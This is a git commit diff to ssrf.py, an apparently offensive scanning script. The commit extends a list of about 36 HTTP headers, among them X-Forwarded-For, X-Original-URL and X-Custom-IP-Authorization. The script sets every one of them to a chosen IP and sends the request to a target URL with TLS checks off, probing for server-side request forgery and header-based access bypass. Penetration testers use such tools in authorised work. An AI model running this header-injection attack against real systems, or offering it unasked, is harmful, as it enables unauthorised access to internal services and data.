c137dc8255693cec12144e93d7e4d7e64c67c384
Kirill Z <storenth@yandex.ru>
2021-02-25 15:43:12 +0700

    shebang, headers, styles, timeout, more verbose debug

--- ssrf.py
+++ ssrf.py
@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 # m4ll0k - github.com/m4ll0k
 
 import requests
@@ -7,12 +9,43 @@ import sys
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 injectable_headers = [
-    "Proxy-Host","Request-Uri","X-Forwarded","X-Forwarded-By","X-Forwarded-For",
-    "X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Server","X-Forwarder-For",
-    "X-Forward-For","Base-Url","Http-Url","Proxy-Url","Redirect","Real-Ip","Referer","Referer",
-    "Referrer","Refferer","Uri","Url","X-Host","X-Http-Destinationurl","X-Http-Host-Override",
-    "X-Original-Remote-Addr","X-Original-Url","X-Proxy-Url","X-Rewrite-Url","X-Real-Ip","X-Remote-Addr"
-    ]
+    "Proxy-Host",
+    "Request-URI",
+    "Request",
+    "X-Forwarded",
+    "X-Forwarded-By",
+    "X-Forwarded-For",
+    "X-Forwarded-For-Original",
+    "X-Forwarded-Host",
+    "X-Forwarded-Server",
+    "X-Forwarder-For",
+    "X-Forward-For",
+    "X-Host",
+    "X-Http-Destinationurl",
+    "X-Http-Host-Override",
+    "X-Original-Remote-Addr",
+    "X-Original-URL",
+    "X-Rewrite-URL",
+    "x-http-path-override",
+    "X-Proxy-Url",
+    "X-Rewrite-Url",
+    "X-Real-Ip",
+    "X-Remote-Addr",
+    "X-Remote-IP",
+    "X-Originating-IP",
+    "X-Custom-IP-Authorization",
+    "X-Client-IP",
+    "Base-Url",
+    "Http-Url",
+    "Proxy-Url",
+    "Redirect",
+    "Real-Ip",
+    "Referer",
+    "Referrer",
+    "Refferer",
+    "URI",
+    "URL"
+]
 
 def read_file(file_path:str)->None:
     try:
@@ -26,21 +59,27 @@ def url_check(url:str)->str:
     url = url.replace(':80','').replace(':443','')
     return url
 
-def main(url:str,ip:str)->None:
+def main(url:str,ip:str):
     headers = {
-        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15' 
+        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15',
+        'Accept': '*/*',
+        'Accept-Encoding': 'gzip, deflate',
+        'Connection': 'close',
+        'Upgrade-Insecure-Requests': '1'
     }
     for header in injectable_headers:
         headers[header] = ip
     try:
         #print('[ + ] URL: %s'%url)
         request = requests.get(
-            url = url_check(url),
+            url = url,
             headers = headers,
             verify = False,
-            allow_redirects = False
+            allow_redirects = False,
+            timeout = (5, 15)
         )
-        print('[ + ] Code: {code} - {url}'.format(code=request.status_code,url=request.url))
+        print('[ + ] Code: {code} - {url}'.format(code=request.status_code, url=request.url))
+        print('url={url} \theaders={headers}\n'.format(url=url, headers=request.request.headers))
     except Exception as err:
         sys.exit(
             print('[ERROR] '+err)
